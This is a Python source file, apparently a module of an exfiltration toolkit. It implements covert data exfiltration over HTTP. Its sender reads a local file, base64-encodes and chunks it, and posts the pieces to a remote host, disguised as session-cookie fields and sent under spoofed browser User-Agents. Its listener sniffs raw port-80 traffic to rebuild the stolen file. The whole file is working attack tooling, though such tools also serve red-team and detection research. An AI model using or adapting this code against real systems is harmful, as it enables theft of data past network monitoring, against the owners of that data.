#!/usr/bin/env python3

import os
import sys
import zlib
import json
import time
import base64
import random
import socket
import requests
import datetime
from struct import unpack

from pyexfil.includes.base import NetworkModule

USER_AGENTS = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
    "Mozilla/2.02E (Win95; U)",
    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
    "Opera/7.50 (Windows XP; U)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
]
HEADERS = {
    'content-type': 'application/json',
    'User-Agent': random.choice(USER_AGENTS),
}

READ_BINARY = "rb"
WRITE_BINARY = "wb"
LOGFILE_BASENAME = "http_log"
LOGFILE_EXT = ".txt"
HTTP_PORT = 80
ETH_P_ALL = 0x0003

INIT_PACKET_COOKIE = "sessionID"
PACKET_COOKIE = "PHPSESSID"
TERMINATION_COOKIE = "sessID0"
COOKIE_DELIMITER = ".."
DATA_END = "00000000000000"


class HTTPCookieExfil(NetworkModule):
    MODULE_NAME = "HTTPCookies"
    PROTOCOL = "http/tcp"

    def __init__(self, host, port=HTTP_PORT, enc_key="", packet_delay=0.05,
                 max_packet_size=1200, verbose=False):
        super().__init__(host=host, port=port, enc_key=enc_key,
                         packet_delay=packet_delay,
                         max_packet_size=max_packet_size, verbose=verbose)

    def _send_impl(self, data, **kwargs):
        file_path = data
        addr = kwargs.get("addr", "http://%s:%s" % (self.host, self.port))
        time_delay = kwargs.get("time_delay", self.packet_delay)
        max_packet_size = kwargs.get("max_packet_size", self.max_packet_size)

        try:
            with open(file_path, READ_BINARY) as fh:
                i_am_file = fh.read()
        except Exception:
            sys.stderr.write("Error reading file!\n")
            raise

        i_am_done = base64.b64encode(i_am_file)
        checksum = zlib.crc32(i_am_done)
        chunks = [i_am_done[i:i + max_packet_size]
                  for i in range(0, len(i_am_done), max_packet_size)]
        head, tail = os.path.split(file_path)

        try:
            init_payload = (tail + COOKIE_DELIMITER + str(checksum)
                            + COOKIE_DELIMITER + str(len(chunks)))
            payload = {INIT_PACKET_COOKIE: init_payload}
            requests.post(addr, data=json.dumps(payload), headers=HEADERS)
            sys.stdout.write("[+] Sent initiation package. Total of %s chunks.\n"
                             % (len(chunks) + 2))
            time.sleep(time_delay)
        except Exception:
            sys.stderr.write("Unable to reach target.\n")
            return False

        current_chunk = 0
        for chunk in chunks:
            chunk_str = chunk.decode() if isinstance(chunk, bytes) else chunk
            payload = {PACKET_COOKIE + str(current_chunk): chunk_str}
            requests.post(addr, data=json.dumps(payload), headers=HEADERS)
            current_chunk += 1
            time.sleep(time_delay)

        term_data = DATA_END + str(current_chunk)
        payload = {TERMINATION_COOKIE: term_data}
        requests.post(addr, data=json.dumps(payload), headers=HEADERS)
        sys.stdout.write("[+] Sent termination packets and total of %s packets.\n"
                         % current_chunk)
        return True

    def _listen_impl(self, callback, **kwargs):
        # AF_PACKET is Linux-only — this listener requires Linux
        local_addr = kwargs.get("addr", self.host)

        def eth_addr(a):
            b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (
                a[0], a[1], a[2], a[3], a[4], a[5]
            )
            return b

        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                               socket.ntohs(ETH_P_ALL))
        except socket.error as msg:
            sys.stderr.write(
                'Socket could not be created. Error Code: '
                + str(msg.args[0]) + ' Message ' + str(msg.args[1]) + "\n"
            )
            raise

        try:
            current_time_as_string = (
                str(datetime.datetime.now()).replace(":", ".").replace(" ", "-")[:-7]
            )
            log_fh = open(LOGFILE_BASENAME + current_time_as_string + LOGFILE_EXT,
                          WRITE_BINARY)
            log_fh.write(
                ("Started logging at %s\n\n" % current_time_as_string).encode()
            )
        except Exception:
            sys.stderr.write("Error starting log file.\n")
            raise

        filename = None
        crc = None
        recvd_data = b""
        fh = None

        while not self._stop_event.is_set():
            packet, address = s.recvfrom(65565)
            eth_length = 14

            eth_header = packet[:eth_length]
            eth = unpack('!6s6sH', eth_header)
            eth_protocol = socket.ntohs(eth[2])

            if eth_protocol == 8 and address[2] == 4:
                ip_header = packet[eth_length:20 + eth_length]
                iph = unpack('!BBHHHBBH4s4s', ip_header)

                version_ihl = iph[0]
                ihl = version_ihl & 0xF
                iph_length = ihl * 4
                protocol = iph[6]
                s_addr = socket.inet_ntoa(iph[8])

                if protocol == 6:
                    t = iph_length + eth_length
                    tcp_header = packet[t:t + 20]
                    tcph = unpack('!HHLLBBHHH', tcp_header)

                    source_port = tcph[0]
                    dest_port = tcph[1]
                    doff_reserved = tcph[4]
                    tcph_length = doff_reserved >> 4

                    if (dest_port == HTTP_PORT) or (source_port == HTTP_PORT):
                        h_size = eth_length + iph_length + tcph_length * 4
                        data = packet[h_size:]

                        init_key = INIT_PACKET_COOKIE.encode()
                        term_key = TERMINATION_COOKIE.encode()
                        pkt_key = PACKET_COOKIE.encode()

                        if init_key in data:
                            data_init_offset = data.find(init_key)
                            viable_data = data[data_init_offset:]
                            sep = b"\": \""
                            filename_b = viable_data[viable_data.find(sep) + len(sep):
                                                     viable_data.find(b"..")]
                            filename = filename_b.decode(errors="replace")
                            viable_data = viable_data[viable_data.find(b"..") + 2:]
                            crc = viable_data[:viable_data.find(b"..")].decode()
                            viable_data = viable_data[viable_data.find(b"..") + 2:]
                            total_packets = viable_data[:viable_data.find(b"\"}")]

                            log_fh.write(("Got initiation packet from " + str(s_addr) + ".\n").encode())
                            log_fh.write(("Filename: %s\n" % filename).encode())
                            log_fh.write(("CRC32: %s\n" % crc).encode())
                            log_fh.write(("Origin IP: %s\n" % s_addr).encode())

                            fh = open(filename + "_" + crc, WRITE_BINARY)
                            recvd_data = b""

                        elif term_key in data:
                            log_fh.write(("Termination from: %s\n" % s_addr).encode())
                            if zlib.crc32(recvd_data) == int(crc):
                                decoded = base64.b64decode(recvd_data)
                                if fh:
                                    fh.write(decoded)
                                    fh.close()
                                log_fh.write(
                                    ("[+] File saved as " + filename + "_" + crc + "\n").encode()
                                )
                                meta = {"addr": address, "file": filename}
                                callback(decoded, meta)
                            else:
                                sys.stderr.write("[!] No CRC match! Will not write file.\n")

                        elif pkt_key in data:
                            data_init_offset = data.find(pkt_key)
                            viable_data = data[data_init_offset:]
                            sep = b"\": \""
                            chunk = viable_data[viable_data.find(sep) + len(sep):
                                                viable_data.find(b"\"}")]
                            recvd_data += chunk


if __name__ == "__main__":
    sys.stdout.write(
        "This is meant to be a module for python and not a stand alone executable\n"
    )
